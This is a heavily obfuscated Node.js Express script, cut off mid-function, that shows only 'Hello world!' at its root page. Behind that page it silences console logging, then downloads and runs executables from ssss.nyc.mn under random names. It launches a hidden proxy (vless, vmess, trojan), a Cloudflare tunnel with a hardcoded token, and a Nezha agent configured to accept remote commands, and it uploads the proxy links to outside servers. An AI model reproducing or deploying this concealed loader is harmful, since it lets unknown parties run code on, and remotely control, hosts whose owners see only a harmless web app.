const _0x4c4a52=_0x51d5;(function(_0x3f4969,_0x115482){const _0x44ebf2=_0x51d5,_0x4ebb3d=_0x3f4969();while(!![]){try{const _0x13c5d3=-parseInt(_0x44ebf2(0x215))/0x1*(-parseInt(_0x44ebf2(0x231))/0x2)+parseInt(_0x44ebf2(0x1e1))/0x3*(parseInt(_0x44ebf2(0x22b))/0x4)+-parseInt(_0x44ebf2(0x1e0))/0x5*(parseInt(_0x44ebf2(0x23e))/0x6)+-parseInt(_0x44ebf2(0x1b4))/0x7+-parseInt(_0x44ebf2(0x267))/0x8+-parseInt(_0x44ebf2(0x1c1))/0x9+-parseInt(_0x44ebf2(0x259))/0xa*(-parseInt(_0x44ebf2(0x1b3))/0xb);if(_0x13c5d3===_0x115482)break;else _0x4ebb3d['push'](_0x4ebb3d['shift']());}catch(_0x4c0bd4){_0x4ebb3d['push'](_0x4ebb3d['shift']());}}}(_0x2ea1,0xb5b8d));const _0x4ed264=(function(){let _0x4f6059=!![];return function(_0x3f8a61,_0x49e33a){const _0x2eb9db=_0x4f6059?function(){const _0x5cb18c=_0x51d5;if(_0x49e33a){const _0x4a493e=_0x49e33a[_0x5cb18c(0x1c4)](_0x3f8a61,arguments);return _0x49e33a=null,_0x4a493e;}}:function(){};return _0x4f6059=![],_0x2eb9db;};}()),_0x1fb1cb=_0x4ed264(this,function(){const _0x31c45a=_0x51d5;return _0x1fb1cb['toString']()['search'](_0x31c45a(0x24a))['toString']()['constructor'](_0x1fb1cb)[_0x31c45a(0x252)](_0x31c45a(0x24a));});_0x1fb1cb();const _0x395acd=(function(){let _0x37fe6b=!![];return function(_0xdb0692,_0x1ab3af){const _0x3e04f1=_0x37fe6b?function(){const _0x2f55bb=_0x51d5;if(_0x1ab3af){const _0x19b167=_0x1ab3af[_0x2f55bb(0x1c4)](_0xdb0692,arguments);return _0x1ab3af=null,_0x19b167;}}:function(){};return _0x37fe6b=![],_0x3e04f1;};}()),_0x598efa=_0x395acd(this,function(){const _0x2d094c=_0x51d5,_0x1c43cd=function(){const _0x5badeb=_0x51d5;let _0x476726;try{_0x476726=Function(_0x5badeb(0x266)+_0x5badeb(0x1df)+');')();}catch(_0x2f3c2a){_0x476726=window;}return _0x476726;},_0x217d29=_0x1c43cd(),_0x2e0377=_0x217d29[_0x2d094c(0x234)]=_0x217d29[_0x2d094c(0x234)]||{},_0x3e0f60=[_0x2d094c(0x1f9),_0x2d094c(0x238),_0x2d094c(0x242),_0x2d094c(0x23c),_0x2d094c(0x1ec),_0x2d094c(0x272),_0x2d094c(0x1ed)];for(let _0x30ec96=0x0;_0x30ec96<_0x3e0f60['length'];_0x30ec96++){const _0x405fb4=_0x395acd[_0x2d094c(0x1d3)]['prototype']['bind'](_0x395acd),_0x3974c0=_0x3e0f60[_0x30ec96],_0x1cbd51=_0x2e0377[_0x3974c0]||_0x405fb4;_0x405fb4[_0x2d094c(0x243)]=_0x395acd[_0x2d094c(0x1da)](_0x395acd),_0x405fb4[_0x2d094c(0x221)]=_0x1cbd51['toString'][_0x2d094c(0x1da)](_0x1cbd51),_0x2e0377[_0x3974c0]=_0x405fb4;}});_0x598efa();const express=require(_0x4c4a52(0x1f1)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x4c4a52(0x1f4)),exec=promisify(require(_0x4c4a52(0x210))[_0x4c4a52(0x1e8)]),{execSync}=require(_0x4c4a52(0x210)),UPLOAD_URL=process[_0x4c4a52(0x25b)][_0x4c4a52(0x20a)]||'',PROJECT_URL=process[_0x4c4a52(0x25b)][_0x4c4a52(0x1b1)]||'',AUTO_ACCESS=process['env'][_0x4c4a52(0x233)]||![],FILE_PATH=process[_0x4c4a52(0x25b)]['FILE_PATH']||_0x4c4a52(0x1ba),SUB_PATH=process[_0x4c4a52(0x25b)][_0x4c4a52(0x25a)]||_0x4c4a52(0x1c7),PORT=process['env'][_0x4c4a52(0x230)]||process[_0x4c4a52(0x25b)][_0x4c4a52(0x20b)]||0xbb8,UUID=process[_0x4c4a52(0x25b)]['UUID']||_0x4c4a52(0x260),NEZHA_SERVER=process[_0x4c4a52(0x25b)][_0x4c4a52(0x1d9)]||'',NEZHA_PORT=process['env'][_0x4c4a52(0x26a)]||'',NEZHA_KEY=process[_0x4c4a52(0x25b)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x4c4a52(0x25b)][_0x4c4a52(0x1bf)]||_0x4c4a52(0x206),ARGO_AUTH=process[_0x4c4a52(0x25b)]['ARGO_AUTH']||_0x4c4a52(0x256),ARGO_PORT=process['env'][_0x4c4a52(0x261)]||0x1156,CFIP=process['env'][_0x4c4a52(0x21a)]||_0x4c4a52(0x1d0),CFPORT=process[_0x4c4a52(0x25b)]['CFPORT']||0x1bb,NAME=process['env']['NAME']||'RW';!fs[_0x4c4a52(0x1f8)](FILE_PATH)?(fs[_0x4c4a52(0x26b)](FILE_PATH),console[_0x4c4a52(0x1f9)](FILE_PATH+_0x4c4a52(0x248))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x251670=_0x4c4a52,_0x3e8272='abcdefghijklmnopqrstuvwxyz';let _0x5900f0='';for(let _0x10014a=0x0;_0x10014a<0x6;_0x10014a++){_0x5900f0+=_0x3e8272[_0x251670(0x251)](Math[_0x251670(0x274)](Math[_0x251670(0x236)]()*_0x3e8272[_0x251670(0x26e)]));}return _0x5900f0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4c4a52(0x1c3)](FILE_PATH,npmName),phpPath=path[_0x4c4a52(0x1c3)](FILE_PATH,phpName),webPath=path[_0x4c4a52(0x1c3)](FILE_PATH,webName),botPath=path[_0x4c4a52(0x1c3)](FILE_PATH,botName),subPath=path[_0x4c4a52(0x1c3)](FILE_PATH,_0x4c4a52(0x1bb)),listPath=path[_0x4c4a52(0x1c3)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4c4a52(0x1c3)](FILE_PATH,_0x4c4a52(0x1e9)),configPath=path[_0x4c4a52(0x1c3)](FILE_PATH,_0x4c4a52(0x1ea));function deleteNodes(){const _0x105916=_0x4c4a52;try{if(!UPLOAD_URL)return;if(!fs[_0x105916(0x1f8)](subPath))return;let _0x17481b;try{_0x17481b=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x3a9a2a=Buffer['from'](_0x17481b,'base64')['toString'](_0x105916(0x1ce)),_0x117e52=_0x3a9a2a[_0x105916(0x277)]('\x0a')['filter'](_0x305b32=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x105916(0x278)](_0x305b32));if(_0x117e52['length']===0x0)return;return axios[_0x105916(0x1dc)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x105916(0x262)]({'nodes':_0x117e52}),{'headers':{'Content-Type':_0x105916(0x1fa)}})['catch'](_0x4e0a34=>{return null;}),null;}catch(_0x3ada89){return null;}}function cleanupOldFiles(){const _0x28a29b=_0x4c4a52;try{const _0x5ae206=fs[_0x28a29b(0x1f6)](FILE_PATH);_0x5ae206[_0x28a29b(0x218)](_0x7af5f5=>{const _0x15b427=_0x28a29b,_0x1b41eb=path[_0x15b427(0x1c3)](FILE_PATH,_0x7af5f5);try{const _0x5f3b58=fs['statSync'](_0x1b41eb);_0x5f3b58[_0x15b427(0x1fc)]()&&fs[_0x15b427(0x241)](_0x1b41eb);}catch(_0x3dc995){}});}catch(_0xe452f2){}}function _0x51d5(_0x2dbea1,_0x34918d){const _0x48997e=_0x2ea1();return _0x51d5=function(_0x598efa,_0x395acd){_0x598efa=_0x598efa-0x1ad;let _0x5d708b=_0x48997e[_0x598efa];return _0x5d708b;},_0x51d5(_0x2dbea1,_0x34918d);}app[_0x4c4a52(0x265)]('/',function(_0x50b66c,_0x2070dc){const _0x435a24=_0x4c4a52;_0x2070dc[_0x435a24(0x25d)](_0x435a24(0x25c));});async function generateConfig(){const _0x271168=_0x4c4a52,_0x2dead9={'log':{'access':_0x271168(0x202),'error':_0x271168(0x202),'loglevel':_0x271168(0x1c8)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x271168(0x235),'settings':{'clients':[{'id':UUID,'flow':_0x271168(0x26f)}],'decryption':_0x271168(0x1c8),'fallbacks':[{'dest':0xbb9},{'path':_0x271168(0x1e2),'dest':0xbba},{'path':_0x271168(0x1bd),'dest':0xbbb},{'path':_0x271168(0x1c0),'dest':0xbbc}]},'streamSettings':{'network':_0x271168(0x247)}},{'port':0xbb9,'listen':_0x271168(0x224),'protocol':_0x271168(0x235),'settings':{'clients':[{'id':UUID}],'decryption':_0x271168(0x1c8)},'streamSettings':{'network':'tcp','security':_0x271168(0x1c8)}},{'port':0xbba,'listen':_0x271168(0x224),'protocol':_0x271168(0x235),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x271168(0x1c8),'wsSettings':{'path':_0x271168(0x1e2)}},'sniffing':{'enabled':!![],'destOverride':[_0x271168(0x1be),_0x271168(0x253),_0x271168(0x1ff)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x271168(0x224),'protocol':_0x271168(0x1e3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x271168(0x1be),_0x271168(0x253),_0x271168(0x1ff)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x271168(0x224),'protocol':_0x271168(0x1e7),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x271168(0x1c8),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x271168(0x1be),_0x271168(0x253),_0x271168(0x1ff)],'metadataOnly':![]}}],'dns':{'servers':[_0x271168(0x201)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x271168(0x254),'tag':_0x271168(0x1fd)}]};fs[_0x271168(0x1e4)](path[_0x271168(0x1c3)](FILE_PATH,'config.json'),JSON['stringify'](_0x2dead9,null,0x2));}function getSystemArchitecture(){const _0x2d053c=_0x4c4a52,_0x4d4f32=os[_0x2d053c(0x24b)]();return _0x4d4f32===_0x2d053c(0x240)||_0x4d4f32===_0x2d053c(0x1cb)||_0x4d4f32===_0x2d053c(0x1dd)?_0x2d053c(0x240):_0x2d053c(0x1ad);}function _0x2ea1(){const _0x51f6f2=['SERVER_PORT','89434Hoogjq','\x20>/dev/null\x202>&1','AUTO_ACCESS','console','vless','random','false','warn','/api/add-subscriptions','includes','automatic\x20access\x20task\x20added\x20successfully','error','unlink','6okPnAK','https://arm64.ssss.nyc.mn/v1','arm','unlinkSync','info','__proto__','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/api/add-nodes','tunnel.yml','tcp','\x20is\x20created','then','(((.+)+)+)+$','arch','stream','win32','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','fileName','\x20failed:\x20','charAt','search','tls','blackhole','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','eyJhIjoiNzlkZWY4MmEyZGY1YjRkMmNhNTg5MTQ3NzcyMWQ4YzQiLCJ0IjoiNmFiYzY1MjEtMTgwYi00OGIxLWJmOTUtMDkwODFlNDUwNmU4IiwicyI6IlltUXlNelF6TWpZdFlUUTFPQzAwWVdFd0xXSTNNMk10TURFNVlqaGpPV1kyTURBNSJ9','2096','Error\x20executing\x20command:\x20','10qWeTpy','SUB_PATH','env','Hello\x20world!','send','map','\x20-s\x20','f52e1c70-e5cb-4722-accf-133edc1bbfdd','ARGO_PORT','stringify','catch','readFileSync','get','return\x20(function()\x20','582552uZMzlA','\x20is\x20running','&fp=firefox&type=ws&host=','NEZHA_PORT','mkdirSync','TunnelSecret','base64','length','xtls-rprx-vision','Empowerment\x20failed\x20for\x20','2087','table','pkill\x20-f\x20\x22[','floor','\x0a\x20\x20\x20\x20','\x0a\x20\x20\x0avmess://','split','test','amd','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','close','set','PROJECT_URL','\x20>/dev/null\x202>&1\x20&','7668441KGjzVD','7565712NrAPlh','platform','\x20-c\x20\x22','data','?security=tls&sni=','true','./tmp','sub.txt','from','/vmess-argo','http','ARGO_DOMAIN','/trojan-argo','6447888LlqUOb','\x0a\x20\x20tunnel:\x20','join','apply','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','tunnel.json','sub2','none','\x20-p\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','arm64','/sub.txt\x20saved\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','utf-8','trim','shopify.com','\x0aclient_secret:\x20','\x20-c\x20','constructor','https://oooo.serv00.net/add-url','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','unshift','message','8443','NEZHA_SERVER','bind','taskkill\x20/f\x20/im\x20','post','aarch64','Error\x20reading\x20boot.log:','{}.constructor(\x22return\x20this\x22)(\x20)','2757815qiVSGg','33mzfSic','/vless-argo','vmess','writeFileSync','\x0a\x20\x20credentials-file:\x20','Skipping\x20adding\x20automatic\x20access\x20task','trojan','exec','boot.log','config.json','nohup\x20','exception','trace','pipe','Content-Type','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','express','Empowerment\x20success\x20for\x20','text/plain;\x20charset=utf-8','util','clear','readdirSync','https://amd64.ssss.nyc.mn/v1','existsSync','log','application/json','\x20>\x20nul\x202>&1','isFile','block','Error\x20in\x20startserver:','quic','has','https+local://8.8.8.8/dns-query','/dev/null','443','2083','\x20successfully','rlwy.goi.qzz.io','2053','Add\x20automatic\x20access\x20task\x20faild:\x20','status','UPLOAD_URL','PORT','firefox','/tunnel.yml\x20run','config.yaml','&path=%2Ftrojan-argo%3Fed%3D2560#','child_process','https://arm64.ssss.nyc.mn/bot','fileUrl','https://amd64.ssss.nyc.mn/agent','push','29ciSiRR','substring','rm\x20-rf\x20','forEach','listen','CFIP','php\x20running\x20error:\x20','ARGO_DOMAIN:','createWriteStream','/vmess-argo?ed=2560','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','App\x20is\x20running','toString','https://amd64.ssss.nyc.mn/web','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','127.0.0.1','https://arm64.ssss.nyc.mn/agent','response','Nodes\x20uploaded\x20successfully','match','finish','basename','426196HPxHMs','filter','http\x20server\x20is\x20running\x20on\x20port:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'];_0x2ea1=function(){return _0x51f6f2;};return _0x2ea1();}function downloadFile(_0x46f551,_0x122941,_0x1eade0){const _0x310ce3=_0x4c4a52,_0x801e7b=_0x46f551;!fs[_0x310ce3(0x1f8)](FILE_PATH)&&fs[_0x310ce3(0x26b)](FILE_PATH,{'recursive':!![]});const _0x1075fc=fs[_0x310ce3(0x21d)](_0x801e7b);axios({'method':_0x310ce3(0x265),'url':_0x122941,'responseType':_0x310ce3(0x24c)})[_0x310ce3(0x249)](_0x37dd63=>{const _0x52fb99=_0x310ce3;_0x37dd63[_0x52fb99(0x1b7)][_0x52fb99(0x1ee)](_0x1075fc),_0x1075fc['on'](_0x52fb99(0x229),()=>{const _0x530a6d=_0x52fb99;_0x1075fc[_0x530a6d(0x1af)](),console[_0x530a6d(0x1f9)]('Download\x20'+path[_0x530a6d(0x22a)](_0x801e7b)+_0x530a6d(0x205)),_0x1eade0(null,_0x801e7b);}),_0x1075fc['on'](_0x52fb99(0x23c),_0xef4091=>{const _0x12ac31=_0x52fb99;fs[_0x12ac31(0x23d)](_0x801e7b,()=>{});const _0x10659a='Download\x20'+path['basename'](_0x801e7b)+_0x12ac31(0x250)+_0xef4091['message'];console[_0x12ac31(0x23c)](_0x10659a),_0x1eade0(_0x10659a);});})[_0x310ce3(0x263)](_0xb9f9e3=>{const _0x3e4667=_0x310ce3,_0x424b9b='Download\x20'+path[_0x3e4667(0x22a)](_0x801e7b)+_0x3e4667(0x250)+_0xb9f9e3['message'];console[_0x3e4667(0x23c)](_0x424b9b),_0x1eade0(_0x424b9b);});}async function downloadFilesAndRun(){const _0x4e84ff=_0x4c4a52,_0x26044f=getSystemArchitecture(),_0xa40636=getFilesForArchitecture(_0x26044f);if(_0xa40636['length']===0x0){console[_0x4e84ff(0x1f9)](_0x4e84ff(0x1d5));return;}const _0x1525fd=_0xa40636[_0x4e84ff(0x25e)](_0xcde18d=>{return new Promise((_0x305393,_0x5c6b5c)=>{const _0x4f5cf1=_0x51d5;downloadFile(_0xcde18d[_0x4f5cf1(0x24f)],_0xcde18d[_0x4f5cf1(0x212)],(_0x33328a,_0x1d32a0)=>{_0x33328a?_0x5c6b5c(_0x33328a):_0x305393(_0x1d32a0);});});});try{await Promise['all'](_0x1525fd);}catch(_0x46e7a7){console[_0x4e84ff(0x23c)]('Error\x20downloading\x20files:',_0x46e7a7);return;}function _0x344f01(_0x5b964a){const _0x49f5e0=_0x4e84ff,_0x3f1f50=0x1fd;_0x5b964a[_0x49f5e0(0x218)](_0x3dbf4c=>{fs['existsSync'](_0x3dbf4c)&&fs['chmod'](_0x3dbf4c,_0x3f1f50,_0x1648e6=>{const _0x45e377=_0x51d5;_0x1648e6?console['error'](_0x45e377(0x270)+_0x3dbf4c+':\x20'+_0x1648e6):console[_0x45e377(0x1f9)](_0x45e377(0x1f2)+_0x3dbf4c+':\x20'+_0x3f1f50['toString'](0x8));});});}const _0x6ed752=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x344f01(_0x6ed752);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x93cc10=NEZHA_SERVER[_0x4e84ff(0x23a)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0xe73945=new Set([_0x4e84ff(0x203),'8443',_0x4e84ff(0x257),_0x4e84ff(0x271),_0x4e84ff(0x204),_0x4e84ff(0x207)]),_0x50857e=_0xe73945[_0x4e84ff(0x200)](_0x93cc10)?_0x4e84ff(0x1b9):_0x4e84ff(0x237),_0x35259a=_0x4e84ff(0x1d1)+NEZHA_KEY+_0x4e84ff(0x223)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x50857e+_0x4e84ff(0x1ae)+UUID;fs[_0x4e84ff(0x1e4)](path[_0x4e84ff(0x1c3)](FILE_PATH,_0x4e84ff(0x20e)),_0x35259a);const _0x38ad03=_0x4e84ff(0x1eb)+phpPath+_0x4e84ff(0x1b6)+FILE_PATH+_0x4e84ff(0x255);try{await exec(_0x38ad03),console[_0x4e84ff(0x1f9)](phpName+_0x4e84ff(0x268)),await new Promise(_0x4ab51a=>setTimeout(_0x4ab51a,0x3e8));}catch(_0x21d078){console[_0x4e84ff(0x23c)](_0x4e84ff(0x21b)+_0x21d078);}}else{let _0x4c2525='';const _0x4ec050=[_0x4e84ff(0x203),_0x4e84ff(0x1d8),'2096',_0x4e84ff(0x271),_0x4e84ff(0x204),_0x4e84ff(0x207)];_0x4ec050['includes'](NEZHA_PORT)&&(_0x4c2525='--tls');const _0x4d8c61=_0x4e84ff(0x1eb)+npmPath+_0x4e84ff(0x25f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4e84ff(0x1c9)+NEZHA_KEY+'\x20'+_0x4c2525+_0x4e84ff(0x22e);try{await exec(_0x4d8c61),console[_0x4e84ff(0x1f9)](npmName+_0x4e84ff(0x268)),await new Promise(_0x48b8d5=>setTimeout(_0x48b8d5,0x3e8));}catch(_0x46b18d){console[_0x4e84ff(0x23c)]('npm\x20running\x20error:\x20'+_0x46b18d);}}}else console[_0x4e84ff(0x1f9)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1e686a='nohup\x20'+webPath+_0x4e84ff(0x1d2)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1e686a),console[_0x4e84ff(0x1f9)](webName+_0x4e84ff(0x268)),await new Promise(_0x3f4b40=>setTimeout(_0x3f4b40,0x3e8));}catch(_0xb447d7){console[_0x4e84ff(0x23c)]('web\x20running\x20error:\x20'+_0xb447d7);}if(fs[_0x4e84ff(0x1f8)](botPath)){let _0x4bdf5e;if(ARGO_AUTH[_0x4e84ff(0x228)](/^[A-Z0-9a-z=]{120,250}$/))_0x4bdf5e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x4bdf5e='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4e84ff(0x20d):_0x4bdf5e=_0x4e84ff(0x21f)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4bdf5e+_0x4e84ff(0x1b2)),console[_0x4e84ff(0x1f9)](botName+'\x20is\x20running'),await new Promise(_0x5c2825=>setTimeout(_0x5c2825,0x7d0));}catch(_0x3451b8){console[_0x4e84ff(0x23c)](_0x4e84ff(0x258)+_0x3451b8);}}await new Promise(_0xc70474=>setTimeout(_0xc70474,0x1388));}function getFilesForArchitecture(_0x5c23dc){const _0x201e14=_0x4c4a52;let _0x2672b2;_0x5c23dc===_0x201e14(0x240)?_0x2672b2=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x201e14(0x211)}]:_0x2672b2=[{'fileName':webPath,'fileUrl':_0x201e14(0x222)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x25e914=_0x5c23dc===_0x201e14(0x240)?_0x201e14(0x225):_0x201e14(0x213);_0x2672b2[_0x201e14(0x1d6)]({'fileName':npmPath,'fileUrl':_0x25e914});}else{const _0x4beb7b=_0x5c23dc==='arm'?_0x201e14(0x23f):_0x201e14(0x1f7);_0x2672b2[_0x201e14(0x1d6)]({'fileName':phpPath,'fileUrl':_0x4beb7b});}}return _0x2672b2;}function argoType(){const _0x58195c=_0x4c4a52;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x58195c(0x1f9)](_0x58195c(0x244));return;}if(ARGO_AUTH[_0x58195c(0x23a)](_0x58195c(0x26c))){fs['writeFileSync'](path[_0x58195c(0x1c3)](FILE_PATH,_0x58195c(0x1c6)),ARGO_AUTH);const _0x44966c=_0x58195c(0x1c2)+ARGO_AUTH[_0x58195c(0x277)]('\x22')[0xb]+_0x58195c(0x1e5)+path[_0x58195c(0x1c3)](FILE_PATH,_0x58195c(0x1c6))+_0x58195c(0x1ca)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x58195c(0x22f);fs['writeFileSync'](path[_0x58195c(0x1c3)](FILE_PATH,_0x58195c(0x246)),_0x44966c);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x55cac1=_0x4c4a52;let _0x1c029d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1c029d=ARGO_DOMAIN,console[_0x55cac1(0x1f9)](_0x55cac1(0x21c),_0x1c029d),await _0x5bee9e(_0x1c029d);else try{const _0x949004=fs[_0x55cac1(0x264)](path['join'](FILE_PATH,_0x55cac1(0x1e9)),_0x55cac1(0x1ce)),_0x4a1348=_0x949004[_0x55cac1(0x277)]('\x0a'),_0x3d2fc3=[];_0x4a1348['forEach'](_0x16f9eb=>{const _0x1a4634=_0x55cac1,_0x567e85=_0x16f9eb[_0x1a4634(0x228)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x567e85){const _0x54f502=_0x567e85[0x1];_0x3d2fc3[_0x1a4634(0x214)](_0x54f502);}});if(_0x3d2fc3[_0x55cac1(0x26e)]>0x0)_0x1c029d=_0x3d2fc3[0x0],console[_0x55cac1(0x1f9)]('ArgoDomain:',_0x1c029d),await _0x5bee9e(_0x1c029d);else{console['log'](_0x55cac1(0x1c5)),fs['unlinkSync'](path[_0x55cac1(0x1c3)](FILE_PATH,_0x55cac1(0x1e9)));async function _0x55d0bb(){const _0x12542f=_0x55cac1;try{process[_0x12542f(0x1b5)]===_0x12542f(0x24d)?await exec(_0x12542f(0x1db)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x12542f(0x273)+botName[_0x12542f(0x251)](0x0)+']'+botName[_0x12542f(0x216)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x405e42){}}_0x55d0bb(),await new Promise(_0x41ed31=>setTimeout(_0x41ed31,0xbb8));const _0x11d771=_0x55cac1(0x21f)+FILE_PATH+_0x55cac1(0x1cd)+ARGO_PORT;try{await exec(_0x55cac1(0x1eb)+botPath+'\x20'+_0x11d771+_0x55cac1(0x1b2)),console[_0x55cac1(0x1f9)](botName+_0x55cac1(0x268)),await new Promise(_0x3e865b=>setTimeout(_0x3e865b,0xbb8)),await extractDomains();}catch(_0x2dd38a){console['error'](_0x55cac1(0x258)+_0x2dd38a);}}}catch(_0x8ebfc9){console[_0x55cac1(0x23c)](_0x55cac1(0x1de),_0x8ebfc9);}async function _0x5bee9e(_0x3d6740){const _0x3f8b46=_0x55cac1,_0x38dcd2=execSync(_0x3f8b46(0x1f0),{'encoding':_0x3f8b46(0x1ce)}),_0x49b479=_0x38dcd2[_0x3f8b46(0x1cf)](),_0x3ea766=NAME?NAME+'-'+_0x49b479:_0x49b479;return new Promise(_0xa0b650=>{setTimeout(()=>{const _0x2c3d6c=_0x51d5,_0x1b84d4={'v':'2','ps':''+_0x3ea766,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2c3d6c(0x1c8),'net':'ws','type':_0x2c3d6c(0x1c8),'host':_0x3d6740,'path':_0x2c3d6c(0x21e),'tls':'tls','sni':_0x3d6740,'alpn':'','fp':_0x2c3d6c(0x20c)},_0x2ad828='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3d6740+_0x2c3d6c(0x269)+_0x3d6740+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3ea766+_0x2c3d6c(0x276)+Buffer['from'](JSON[_0x2c3d6c(0x262)](_0x1b84d4))[_0x2c3d6c(0x221)](_0x2c3d6c(0x26d))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x2c3d6c(0x1b8)+_0x3d6740+_0x2c3d6c(0x269)+_0x3d6740+_0x2c3d6c(0x20f)+_0x3ea766+_0x2c3d6c(0x275);console['log'](Buffer['from'](_0x2ad828)[_0x2c3d6c(0x221)](_0x2c3d6c(0x26d))),fs[_0x2c3d6c(0x1e4)](subPath,Buffer['from'](_0x2ad828)[_0x2c3d6c(0x221)](_0x2c3d6c(0x26d))),console[_0x2c3d6c(0x1f9)](FILE_PATH+_0x2c3d6c(0x1cc)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4dd722,_0xf298a6)=>{const _0x301fe0=_0x2c3d6c,_0x199be4=Buffer[_0x301fe0(0x1bc)](_0x2ad828)[_0x301fe0(0x221)](_0x301fe0(0x26d));_0xf298a6[_0x301fe0(0x1b0)](_0x301fe0(0x1ef),_0x301fe0(0x1f3)),_0xf298a6[_0x301fe0(0x25d)](_0x199be4);}),_0xa0b650(_0x2ad828);},0x7d0);});}}async function uploadNodes(){const _0x5e5b66=_0x4c4a52;if(UPLOAD_URL&&PROJECT_URL){const _0x40533b=PROJECT_URL+'/'+SUB_PATH,_0x120928={'subscription':[_0x40533b]};try{const _0x2e7a14=await axios[_0x5e5b66(0x1dc)](UPLOAD_URL+_0x5e5b66(0x239),_0x120928,{'headers':{'Content-Type':_0x5e5b66(0x1fa)}});return _0x2e7a14&&_0x2e7a14[_0x5e5b66(0x209)]===0xc8?(console[_0x5e5b66(0x1f9)]('Subscription\x20uploaded\x20successfully'),_0x2e7a14):null;}catch(_0x1d6278){if(_0x1d6278[_0x5e5b66(0x226)]){if(_0x1d6278[_0x5e5b66(0x226)][_0x5e5b66(0x209)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5e5b66(0x1f8)](listPath))return;const _0x4fb379=fs[_0x5e5b66(0x264)](listPath,_0x5e5b66(0x1ce)),_0x2e0a4a=_0x4fb379[_0x5e5b66(0x277)]('\x0a')[_0x5e5b66(0x22c)](_0x5b6055=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5e5b66(0x278)](_0x5b6055));if(_0x2e0a4a[_0x5e5b66(0x26e)]===0x0)return;const _0x582b6a=JSON['stringify']({'nodes':_0x2e0a4a});try{const _0x37e149=await 